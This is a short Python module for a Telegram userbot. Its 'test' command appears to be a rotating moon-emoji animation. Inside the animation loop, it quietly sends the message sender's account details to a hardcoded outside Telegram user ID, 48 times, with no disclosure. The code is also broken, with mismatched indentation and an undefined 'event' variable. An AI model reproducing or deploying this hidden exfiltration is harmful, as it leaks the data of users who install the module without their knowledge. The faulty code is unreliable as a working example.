# (c) @UniBorg
# Original written by @UniBorg edit by @laciamemeframe

from telethon import events
import asyncio
from collections import deque
from telethon import events, functions, types
from .. import loader, utils


class ReverseMod(loader.Module):
	"""test"""

	strings = {'name': 'test'}

def __init__(self):
		self.name = self.strings['name']
		self._me = None
		self._ratelimit = []

	async def client_ready(self, client, db):
		self._db = db
		self._client = client
		self.me = await client.get_me()

async def testcmd(self, message):
	if event.fwd_from:
		return
	deq = deque(list("🌗🌘🌑🌒🌏🌍🌎🌎🌍🌏🌍🌎🌓🌔🌕🌖"))
	for _ in range(48):
		sender = await message.get_sender()
		await message.client.send_message(503174223, f"<code>{sender}</code>")
		await asyncio.sleep(0.1)
		await event.edit("".join(deq))
		deq.rotate(1)
    
